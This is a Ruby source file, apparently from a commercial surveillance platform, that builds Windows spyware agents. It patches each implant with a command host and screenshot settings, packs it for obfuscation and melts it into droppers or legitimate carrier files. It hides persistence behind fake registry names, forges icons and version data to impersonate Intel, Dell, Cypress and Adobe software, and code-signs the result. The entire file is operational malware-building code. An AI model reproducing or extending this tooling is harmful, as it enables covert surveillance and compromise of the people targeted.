#
#  Agent creation for windows
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/binary'

module RCS
module DB

class BuildWindows < Build

  def initialize
    super
    @platform = 'windows'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :windows, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super

    # patch the core64
    params[:core] = 'core64'
    params[:config] = nil
    super

    # patch the scout
    params[:core] = 'scout'
    params[:config] = nil
    super

    # patch the soldier
    params[:core] = 'soldier'
    params[:config] = nil
    super

    marker = nil

    trace :debug, "Patching soldier config"

    patch_file(:file => 'soldier') do |content|
      begin
        marker = "Config"
        #TODO: binary patch the config
      rescue Exception => e
        raise "#{marker} marker not found: #{e.message}"
      end
    end

    trace :debug, "Patching scout for sync and shot"

    patch_file(:file => 'scout') do |content|
      begin
        host = @factory.configs.first.sync_host
        raise "Sync host not found" unless host
        marker = "Sync"
        content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")

        marker = "Screenshot"
        # pay attention this flag is inverted. 0000 means screenshot is enabled, 1111 is disabled
        content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"

        marker = "Module name"
        content.binary_patch 'MODUNAME', module_name('scout')
      rescue Exception => e
        raise "#{marker} marker not found: #{e.message}"
      end
    end

    trace :debug, "Patching core function names and registry"

    patch_file(:file => 'core') do |content|
      begin
        # patching for the function name
        marker = "Funcname"
        patch_func_names(content)

        marker = 'dllname'
       content.binary_patch 'MODUNAME', module_name('core')

        # the new registry key
        marker = "Registry key"
        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
      rescue Exception => e
        raise "#{marker} marker not found: #{e.message}"
      end
    end

    trace :debug, "Patching core64 function names and registry"

    # we have an exception here, the core64 must be patched only with some values
    patch_file(:file => 'core64') do |content|
      begin
        # patching for the function name
        marker = "Funcname"
        patch_func_names(content)

        marker = 'dllname'
        content.binary_patch 'MODUNAME', module_name('core64')

        # the new registry key
        marker = "Registry key"
        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
      rescue Exception => e
        raise "#{marker} marker not found: #{e.message}"
      end
    end

    # patching the build time
    patch_build_time('core')
    patch_build_time('core64')
    patch_build_time('codec')
    patch_build_time('sqlite')
    patch_build_time('silent')

    # code obfuscator
    CrossPlatform.exec path('packer32'), "#{path('core')}"
    CrossPlatform.exec path('packer64'), "#{path('core64')}"
  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7)
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    codec = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    core64 = scramble_name(config, 15)
    oldreg = old_reg_start_key(@factory.confkey)
    reg = reg_start_key(@factory.confkey)

    @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
                  dir: dir, reg: reg, oldreg: oldreg, config: config, codec: codec }

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'agent'

    # parse the parameters
    @cooked = params['cooked'] ? true : false
    @admin = params['admin'] ? true : false
    @bit64 = (params['bit64'] == false) ? false : true
    @codec = (params['codec'] == false) ? false : true
    @scout = (params['scout'] == false) ? false : true
    @soldier = (params['soldier'] == false) ? false : true
    @melted = params['input'] ? true : false

    # choose the correct melting mode
    melting_mode = :silent
    melting_mode = :cooked if @cooked
    melting_mode = :melted if @melted

    # change the icon of the exec accordingly to the name
    customize_scout_and_soldier(@factory.confkey) if @scout or @soldier

    trace :debug, "Build: melting mode: #{melting_mode}"

    case melting_mode
      when :silent
        silent()
      when :cooked
        # this is a build for the NI
        cook()
      when :melted
        # user-provided file to melt with
        melted(Config.instance.temp(params['input']))
    end

    File.exist? path('output') || raise("output file not created")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']
  end

  def sign(params)
    trace :debug, "Build: signing: #{params}"

    # don't sign cooked file (its not a valid PE)
    # don't sign melted files (firefox signed by us is not credible)
    return if @cooked or @melted

    # perform the signature
    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('output')}" if to_be_signed?(params)
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  rescue Exception => e
    trace :warn, "Cannot pack: #{e.message}"
    retry if attempt ||= 0 and attempt += 1 and attempt < 5
    raise
  end

  def unique(core)
    Zip::File.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}

      core_content = z.file.open('core64', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core64'), "wb") {|f| f.write core_content}

      core_content = z.file.open('scout', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')

    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core64')}"
    FileUtils.rm_rf Config.instance.temp('core64')

    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
    FileUtils.rm_rf Config.instance.temp('scout')
  end

  def scout_name(seed)
    scout_names = [
    	{name: 'BTHSAmpPalService', version: '15.5.0.14', desc: 'Intel(r) Centrino(r) Wireless Bluetooth(r) + High Speed Virtual Adapter', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 2012'},
    	{name: 'CyCpIo', version: '2.5.0.16', desc: 'Trackpad Bus Monitor', company: 'Cypress Semiconductor Corporation', copyright: 'Copyright (c) 2012 Cypress Semiconductor Corporation'},
    	{name: 'CyHidWin', version: '2.5.0.16', desc: 'Trackpad Gesture Engine Monitor', company: 'Cypress Semiconductor Inc.', copyright: '(c) 2012 Cypress Semiconductor Inc. All rights reserved.'},
    	{name: 'iSCTsysTray', version: '3.0.30.1526', desc: 'Intel(r) Smart Connect Technology System Tray Notify Icon', company: 'Intel Corporation', copyright: 'Copyright (c) 2011 Intel Corporation'},
    	{name: 'quickset', version: '11.1.27.2', desc: 'QuickSet', company: 'Dell Inc.', copyright: '(c) 2010 Dell Inc.'}
    ]

    scout_names[seed.ord % scout_names.size]
  end

  private

  def cook
    if @scout
      name = scout_name(@factory.confkey)[:name]
      cook_param = '-S ' + path('scout') + ' -O ' + path('output') + ' -N ' + name
    else
      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase

      # write the ini file
      File.open(path('RCS.ini'), 'w') do |f|
        f.puts "[RCS]"
        f.puts "HUID=#{@factory.ident}"
        f.puts "HCORE=#{@scrambled[:core]}"
        f.puts "HCONF=#{@scrambled[:config]}"
        f.puts "CODEC=#{@scrambled[:codec]}" if @codec
        f.puts "DLL64=#{@scrambled[:core64]}" if @bit64

        # TODO: driver removal (just comment them here)
        #f.puts "HDRV=#{@scrambled[:driver]}"
        #f.puts "DRIVER64=#{@scrambled[:driver64]}"

        f.puts "HDIR=#{@scrambled[:dir]}"
        f.puts "HREG=#{@scrambled[:reg]}"
        f.puts "HSYS=ndisk.sys"
        f.puts "HKEY=#{key}"
        f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
        f.puts "FUNC=" + "#{@funcnames[5]},#{@funcnames[8]}"
        f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
      end
      cook_param = '-C -R ' + path('') + ' -O ' + path('output')
    end

    CrossPlatform.exec path('cooker'), cook_param

    File.exist? path('output') || raise("cooker output file not created")
  end

  def silent
    if @scout
      # the scout is already created
      FileUtils.cp path('scout'), path('output')
    elsif @soldier
      # the scout is already created
      FileUtils.cp path('soldier'), path('output')
    else
      # we have to create a silent installer
      cook()
      cooked = File.open(path('output'), 'rb') {|f| f.read}

      # we have a static var of 1 MiB
      raise "cooked file is too big" if cooked.bytesize > 1024*1024

      patch_file(:file => 'silent') do |content|
        begin
          offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
          raise "offset is nil" if offset.nil?
          content.binary_patch_at_offset offset, cooked
        rescue Exception => e
          raise "Room for cooked not found: #{e.message}"
        end
      end

      # delete the cooked output file and overwrite it with the silent output
      FileUtils.rm_rf path('output')
      FileUtils.cp path('silent'), path('output')
    end
  end

  def melted(input)
    FileUtils.mv input, path('input')

    if @scout
      name = scout_name(@factory.confkey)[:name]
      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('input') + ' ' + path('output') + ' ' + name
    else
      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                          path(@scrambled[:config])+' '+

                                          # TODO: driver removal
                                          'null ' +
                                          'null ' +
                                          #path(@scrambled[:driver])+' '+
                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+

                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                          @scrambled[:dir]+' '+
                                          (@admin ? '1' : '0') +' '+
                                          "#{@funcnames[5]},#{@funcnames[8]}" +' '+
                                          path('input') + ' ' +
                                          path('output')
    end
  end

  def add_random(file)
    File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
  end

  def to_be_signed?(params = nil)
    # default case
    do_signature = false

    # not requested but the cert is present
    if (params.nil? or not params.has_key? 'sign') and File.exist? Config.instance.cert("windows.pfx")
      do_signature = true
    end

    # explicit request to sign the code
    if not params.nil? and params['sign']
      raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
      do_signature = true
    end

    # explicit request to NOT sign the code
    if not params.nil? and params['sign'] == false
      do_signature = true
    end

    do_signature
  end

  def reg_start_key(seed)
    fakever = (seed[2].ord % 10).to_s + '.' + (seed.slice(0..2).unpack('S').first % 100).to_s

    fake_names = ['Restore Point',      'Backup Status',    'HD Audio',         'HD Audio balance', 'Bluetooth Pairing',
                  'Intel(R) Interface', 'Intel PROSet',     'Delayed launcher', 'Intel USB Device', 'Smart Connect',
                  'Java(TM) SE update', 'Audio Background', 'Wifi Manager',     'Adobe(R) Updater', 'Google Update',
                  'Broadcom WiFi',      'Intel(R) Wifi',    'Track Gestures',   'Wifi Assistant',   'Flash Update'
                 ]

    # the name must be less than 23
    name = fake_names[seed.ord % fake_names.size] + ' ' + fakever

    raise "Registry key name too long" if name.length > 23

    return name
  end

  def old_reg_start_key(seed)
    fakever = (seed[2].ord % 11).to_s + '.' + seed.slice(0..2).unpack('S').first.to_s

    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'IconStor', 'wsus', 'MSInst', 'WinIME',
                  'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                  'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
    fake_names[seed.ord % fake_names.size] + ' ' + fakever
  end

  def customize_scout_and_soldier(seed)

    scout_seed = seed[0]
    soldier_seed = scout_seed.next

    info_scout = scout_name(scout_seed)
    icon_scout = "icons/#{info_scout[:name]}.ico"
    info_soldier = scout_name(soldier_seed)
    icon_soldier = "icons/#{info_soldier[:name]}.ico"

    # binary patch the name of the scout once copied in the startup
    patch_file(:file => 'scout') do |content|
      begin
        # the filename of the final exec
        content.binary_patch 'SCOUT'*4, info_scout[:name].ljust(20, "\x00")
      rescue
        raise "Scout name marker not found"
      end
    end
    patch_file(:file => 'soldier') do |content|
      begin
        # the filename of the final exec
        content.binary_patch 'SCOUT'*4, info_soldier[:name].ljust(20, "\x00")
      rescue
        raise "Soldier name marker not found"
      end
    end

    # change the icon
    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_scout)}"
    CrossPlatform.exec path('rcedit'), "/I #{path('soldier')} #{path(icon_soldier)}"

    # change the infos
    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info_scout[:version]}\" /s pb \"\" /s desc \"#{info_scout[:desc]}\" /s company \"#{info_scout[:company]}\" /s (c) \"#{info_scout[:copyright]}\" /s product \"#{info_scout[:desc]}\" /pv \"#{info_scout[:version]}\""
    CrossPlatform.exec path('verpatch'), "/fn /va #{path('soldier')} \"#{info_soldier[:version]}\" /s pb \"\" /s desc \"#{info_soldier[:desc]}\" /s company \"#{info_soldier[:company]}\" /s (c) \"#{info_soldier[:copyright]}\" /s product \"#{info_soldier[:desc]}\" /pv \"#{info_soldier[:version]}\""

    # pack the scout
    #CrossPlatform.exec path('packer32'), "#{path('scout')}"

    # vmprotect the scout
    #CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
    #FileUtils.mv path('scout_vmp'), path('scout')

    # sign it
    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('soldier')}" if to_be_signed?
  end

  def customize_icon(file, icon)
    case icon
      when 'flash'
        icon_file = "icons/#{icon}.ico"
        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
    end

    # change the icon
    CrossPlatform.exec path('rcedit'), "/I #{file} #{path(icon_file)}"

    # change the infos
    CrossPlatform.exec path('verpatch'), "/fn /va #{file} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
  end

  def patch_build_time(file)
    patch_file(:file => file) do |content|
      begin
        offset = content.index("PE\x00\x00")
        raise if offset.nil?
        time = Time.now.to_i
        content.binary_patch_at_offset offset + 8, [time].pack('I')
      rescue
        raise "build time offset not found"
      end
    end
  end

  def patch_func_names(content)
    # calculate the function name for the dropper
    @funcnames = []

    (1..12).each do |index|
      # take the first letter (ignore nums) of the log key
      # it must be a letter since it's a function name
      first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
      progressive = ('A'.ord + first_alpha.ord % 10 + index).chr
      @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey + LicenseManager.instance.limits[:magic]).unpack('H*').first[0..7] + progressive
    end

    (1..12).each do |index|
      find = "PPPFTBBP%02d" % index

      trace :debug, "FUNC: #{find} -> #{@funcnames[index]}" if content[find]

      content.binary_patch find, @funcnames[index] if content[find]
    end
    content
  end

  def module_name(file)
    # take the first letter (ignore nums) of the log key
    # it must be a letter since it's a function name
    first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]

    progressive = '0'

    case file
      when 'core'
        progressive = ('A'.ord + (first_alpha.ord + 32) % 26).chr
      when 'core64'
        progressive = ('A'.ord + (first_alpha.ord + 64) % 26).chr
      when 'scout'
        progressive = ('A'.ord + (first_alpha.ord + 17) % 26).chr
    end

    first_alpha + SecureRandom.hex(1) + progressive + LicenseManager.instance.limits[:magic][4..7]
  end

end

end #DB::
end #RCS::
